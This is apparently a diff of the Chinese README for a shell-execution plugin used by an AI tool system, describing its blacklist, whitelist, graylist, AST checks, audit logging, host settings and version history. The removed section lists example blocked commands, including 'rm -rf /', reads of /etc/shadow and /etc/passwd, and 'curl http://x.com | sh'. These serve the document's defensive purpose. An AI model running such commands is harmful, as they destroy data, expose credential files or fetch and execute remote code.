+- 显式传入 `terminalId` 时，命令在该终端的持久 PTY / SSH Channel 中前台运行。
+- 默认终端忙碌时，未显式指定终端的请求会自动派生 `default_sub_*` 子 Channel。
+- 终端会话保存在插件进程内；交互场景需保持同一 direct / proxy 服务进程。
+- 完成判据使用唯一 `PS1` 哨兵，不会把完成标记误写入等待 stdin 的程序。
+
+## hosts.json 常用字段
+
+| 字段 | 说明 |
+| :--- | :--- |
+| `type` | `local` 或 `ssh` |
+| `enabled` | 是否启用，默认 `true` |
+| `host` / `port` / `username` | SSH 连接信息 |
+| `authMethod` | `key` 或 `password` |
+| `privateKeyPath` / `passphrase` | 密钥认证 |
+| `password` | 密码认证 |
+| `jumpHost` | 跳板机 hostId |
+| `tags` | 标签数组，供 `@tag` 使用 |
+| `timeout` / `keepAliveInterval` | 连接超时与保活 |
+
+`globalSettings` 可配置 `maxConcurrentConnections`、`enableExecutionQueue`、`maxExecutionQueueLength` 等连接层参数。
+
+## 安全管控
+
+所有执行入口（普通命令、脱钩任务、虚拟终端、预设）在进入执行队列前统一经过以下校验：
+
+1. **提权前置拦截**：`sudo` / `su` / `pkexec` / `doas` 直接拒绝。
+2. **特殊操作符硬护栏**：禁止 `;`、后台 `&`、子 shell `$()` / 反引号；`&&` / `||` 按安全级别放行。
+3. **黑名单**：`config.env` 中的 `FORBIDDEN_PATTERNS` / `FORBIDDEN_COMMANDS`。
+4. **白名单**：命中白名单且参数、路径、管道合法时免费放行。
+5. **灰名单**：需要 `requireAdmin` 验证码；`critical` 风险还需 `doubleConfirm: true`。
+6. **未知命令**：不在任何名单中时必须提供有效管理员验证码才能执行。
+7. **AST 语义分析**：命令注入、路径遍历、编码载荷、网络外泄、提权等 critical 风险直接拒绝。
+8. **审计**：`maximum` 级别记录成功执行；拦截事件始终记录到 `AUDIT_LOG_DIR`。
+
+### 审核顺序
+
+`提权拦截 → 特殊操作符 → 黑名单 → 白名单 → 灰名单(验证码) → 未知命令(验证码) → AST → 审计`
+
+- **黑名单先于白名单**：黑名单是绝对拒绝，白名单不能覆盖。
+- **预设命令**：管理员在 `presets.json` 维护的可信模板，跳过黑/白/灰名单、特殊操作符与 AST，仅保留提权前置拦截、预设 `securityLevel` 验证与审计。
+
+安全级别由 `hosts.json` 的 `securityLevel`、请求参数 `securityLevel` 或 `DEFAULT_SECURITY_LEVEL` 决定：
+
+| 级别 | 启用层 |
+| :--- | :--- |
+| `basic` | 黑名单 |
+| `standard` | 黑名单 + 白名单/灰名单 + AST |
+| `high` | 黑名单 + 白名单/灰名单 + AST |
+| `maximum` | 上述 + 审计 |
+
+常用安全配置（`config.env`）：
+
+| 变量 | 说明 |
+| :--- | :--- |
+| `FORBIDDEN_PATTERNS` / `FORBIDDEN_COMMANDS` | 黑名单正则 / 精确命令 |
+| `DEFAULT_SECURITY_LEVEL` | 默认安全级别 |
+| `AUDIT_LOG_DIR` | 审计日志目录（相对路径基于 VCP 工作目录） |
+| `ALERT_WEBHOOK` / `ALERT_THRESHOLD` | 安全事件告警 |
+| `TIMEOUT_MS` | 默认同步等待阈值，实际限制在 1000-55000ms |
+| `MAX_OUTPUT_LINES` / `MAX_OUTPUT_SIZE` | 单次输出行数 / 字节数上限 |
+
+> `plugin-manifest.json` 的 `requiresAdmin` 为 `true` 时，VCP 主进程会把解密后的管理员验证码注入执行上下文；`DECRYPTED_AUTH_CODE` 不需要写死在 `config.env`。
+>
+> `SANDBOX_BACKEND` / `RLIMIT_*` 及对应的 `SandboxManager` 已从 v2 执行路径移除；如需强隔离，请在主机或容器层部署。
+
+> 生产环境仍建议在网关层增加调用方鉴权与命令审核。
+
+## 回归测试
 
 ```bash
-# 黑名单拦截
-rm -rf /                    # ❌ 匹配禁止模式
-poweroff                    # ❌ 精确匹配禁止命令
-
-# 白名单拦截
-apt install vim             # ❌ apt 不在白名单
-ls /etc/shadow              # ❌ 路径在拒绝列表
-
-# AST 分析拦截
-echo $(cat /etc/passwd)     # ❌ 命令注入
-curl http://x.com | sh      # ❌ 网络外泄
-sudo ls                     # ❌ 提权尝试
+node Plugin/LinuxShellExecutor/test/run_suite.js
 ```
 
-### 允许执行的安全命令
-
-```bash
-ls -la /tmp                 # ✓
-cat /var/log/syslog         # ✓
-grep -r "error" /var/log    # ✓
-ps aux                      # ✓
-df -h                       # ✓
-```
+覆盖多机广播、故障隔离、超时脱钩、`queryTask` 生命周期、`cancelTask`、Ctrl+C 穿透、stdin 注入、忙碌终端自动升轨、安全授权管线、预设命令共 10 项用例。
 
 ## 目录结构
 
-```
+```text
 Plugin/LinuxShellExecutor/
-├── LinuxShellExecutor.js    # 主执行器
-├── plugin-manifest.json     # 插件配置
-├── config.env               # 安全策略配置
-├── securityLevels.json      # 🆕 四级安全分级配置
-├── presets.json# 🆕 预设诊断命令配置
-├── whitelist.json           # 白名单配置（免验证命令）
-├── graylist.json            # 灰名单配置（需验证命令）
-├── hosts.json               # 主机配置
-├── README.md                # 使用文档
-├── ssh/
-│   └── SSHManager.js        # SSH 连接管理器
-└── logs/
-    └── audit/               # 审计日志目录
+├── LinuxShellExecutor.js      # 插件入口与 Action 路由
+├── core/
+│   ├── TaskStore.js           # 任务注册表 + POSIX 哨兵包装
+│   └── OutputFormatter.js     # 统一 Markdown 渲染
+├── test/run_suite.js          # 10 项端到端回归
+├── hosts.json                 # 主机配置
+├── config.env                 # 黑名单/审计/默认安全级别等配置
+├── presets.json               # 预设命令
+└── plugin-manifest.json       # 插件清单
 ```
 
-## 四级安全分级详解 (v0.4.0)
+## 版本
 
-| 级别 | 说明 | 管道 | 重定向 | 验证要求 | 示例命令 |
-|------|------|------|--------|----------|----------|
-| `read` | 只读命令 | ✅ | ❌ | 无需验证 | ls, cat, grep, ps, df, free |
-| `safe` | 低风险命令 | ✅ | ❌ | 无需验证 | systemctl status, docker ps |
-| `write` | 写操作命令 | ✅ | ✅ | 需要验证 | echo, tee, systemctl restart |
-| `danger` | 高危命令 | ❌ | ❌ | 二次确认 | rm, kill -9, reboot |
-
-### 管道链规则
-
-只允许以下安全级别组合的管道链：
-- `read → read`（如 `ps aux | grep nginx`）
-- `read → safe`（如 `cat log | head -100`）
-- `safe → read`（如 `docker logs | grep error`）
-
-### 重定向规则
-
-- 只有 `write` 级别命令允许使用重定向
-- 允许的目标路径：`/tmp/*`, `/var/log/*`, `~/*`
-- 禁止的目标路径：`/etc/*`, `/bin/*`, `/sbin/*`, `/usr/*`
-
-## 预设诊断命令 (v0.4.0)
-
-### 可用预设列表
-
-| 预设名 | 说明 | 参数 |
-|--------|------|------|
-| `quickDiag` | 快速系统诊断 | 无 |
-| `checkService` | 检查服务状态 | serviceName (必需) |
-| `netDiag` | 网络诊断 | 无 |
-| `checkDisk` | 磁盘详细检查 | 无 |
-| `checkDocker` | Docker 状态检查 | containerName (可选) |
-| `checkMysql` | MySQL 状态检查 | 无 |
-| `checkRedis` | Redis 状态检查 | 无 |
-| `checkNginx` | Nginx 状态检查 | 无 |
-| `securityAudit` | 安全审计 | 无 |
-| `performanceCheck` | 性能检查 | 无 |
-| `logAnalysis` | 日志分析 | logFile (必需), pattern (可选) |
-| `processTree` | 进程树查看 | 无 |
-
-### 预设命令调用示例
-
-```
-# 快速系统诊断
-<<<[TOOL_REQUEST]>>>
-tool_name:「始」LinuxShellExecutor「末」,
-command:「始」preset:quickDiag「末」
-<<<[END_TOOL_REQUEST]>>>
-
-# 检查 nginx 服务
-<<<[TOOL_REQUEST]>>>
-tool_name:「始」LinuxShellExecutor「末」,
-command:「始」preset:checkService?serviceName=nginx「末」
-<<<[END_TOOL_REQUEST]>>>
-
-# 分析日志文件
-<<<[TOOL_REQUEST]>>>
-tool_name:「始」LinuxShellExecutor「末」,
-command:「始」preset:logAnalysis?logFile=/var/log/syslog&pattern=error「末」
-<<<[END_TOOL_REQUEST]>>>
-
-# 列出所有预设
-<<<[TOOL_REQUEST]>>>
-tool_name:「始」LinuxShellExecutor「末」,
-action:「始」listPresets「末」
-<<<[END_TOOL_REQUEST]>>>
-```
-
-## 输出格式化 (v0.4.0)
-
-### 输出格式选项
-
-| 格式 | 说明 |
-|------|------|
-| `raw` | 原始输出，不做任何处理 |
-| `formatted` | 格式化输出（默认），自动截断、表格美化 |
-| `json` | JSON 格式输出，便于程序解析 |
-
-### 自动截断
-
-- 默认最大输出行数：100 行
-- 超过限制时返回 `truncated: true`
-- 完整输出保存到临时文件，返回 `fullOutputPath`
-
-### 表格美化
-
-自动识别并美化以下命令的表格输出：
-- `ps`、`docker ps`、`df`、`free`、`netstat`、`ss`
-
-## 版本历史
-
-- **v1.2.0** - 配置回退与接口简化
-  - 实现 Host 配置回退机制，支持插件本地 `hosts.json`。
-  - 简化 `listHosts` 输出，移除连通性过滤逻辑。
-  - 升级 `getHostConfig` 为异步方法以支持文件系统回退。
-- **v1.1.9** - 连接策略优化与资源回收
-  - 重构 SSH 连接逻辑，默认不使用连接池以适配 VCP 多进程架构。
-  - 实现命令执行完毕后自动断开非池化连接，防止进程挂起。
-- **v1.1.8** - SSHManager 共享模块重构 (v1.2.4)
-  - 将 LinuxShellExecutor 私有 SSHManager 逻辑合并至共享模块。
-  - 实现 `basePath` 动态私钥路径解析，支持插件级私钥文件。
-  - 插件入口对齐 `getSSHManager(config, options)` 接口。
-- **v1.1.7** - 审计修复与稳定性增强
-  - 修复 `isLongRunning` 异步闭环逻辑，确保长时任务托管至 `MonitorManager`。
-  - 修正 `main()` 异步包装，解决 `Discovery` 资产发现状态透传失效问题。
-  - 调整安全校验顺序，支持授权码逃逸白名单及安全等级限制。
-  - 增强 `SecurityLevelValidator`，实现特殊操作符（`;`, `&&`, `|`）校验。
-  - 在内置及共享 `SSHManager` 模块中引入输出长度限制，彻底根治 OOM 风险。
-- **v1.1.6** - SSH 认证安全加固 (PAM Defense)
-  - 显式禁用 `keyboard-interactive` 探测，规避 PAM 认证失败计数。
-  - 引入 `hostQueues` 主机级锁，强制认证过程串行化。
-- **v1.1.5** - 全平台静默安装与资源锁柔性修复
-- **v1.1.0** - 授权码逃逸、资产引导、长待机指令支持
-- **v0.4.0** - 四级安全分级、预设命令、输出格式化
-  - 新增四级安全分级（read/safe/write/danger）
-  - 新增智能管道链验证
-  - 新增 12 个预设诊断命令
-  - 新增输出格式化（自动截断、表格美化）
-  - 新增 securityLevels.json 和 presets.json 配置文件
-- **v0.3.1** - 新增三级权限控制（白名单/灰名单/黑名单）
-  - 白名单命令无需验证即可执行
-  - 灰名单命令需要管理员验证码
-  - 新增 graylist.json 配置文件，包含运维命令
-  - 支持 systemctl、docker、kill、journalctl 等运维命令
-- **v0.3.0** - 新增资源限制(rlimit)、管道命令验证、SSH连接池优化
-  - 实现 RlimitManager 类，支持 CPU/内存/文件/进程数限制
-  - 实现管道命令解析和验证，支持 allowedPipeCommands 和 forbiddenInPipe
-  - SSH 连接池增加连接数量限制、自动重试、等待队列
-- **v0.2.0** - 新增多主机 SSH 远程执行、密钥认证、跳板机支持
-- **v0.1.0** - 初始版本，实现六层安全架构
+- **v2.1.0**：`hostId` 改为逗号分隔字符串；新增 checkMemory / checkCpu / checkDiskUsage / checkPorts / checkProcesses 预设；预设模板跳过黑/白/灰名单、特殊操作符与 AST；整理 config.env、恢复 requiresAdmin 验证码注入；移除 SandboxManager/RlimitManager 等死代码。
+- **v2.0.2**：恢复黑名单/白名单/灰名单/特殊操作符/AST/审计授权管线；新增 TC-09 安全回归。
+- **v2.0.1**：README 精简与文档对齐；`LinuxLogMonitor` 清单保持 `.block` 禁用。
+- **v2.0.0**：多机广播、超时脱钩、任务哨兵、虚拟终端、统一 Markdown 回显。
 
 ## 许可证
 
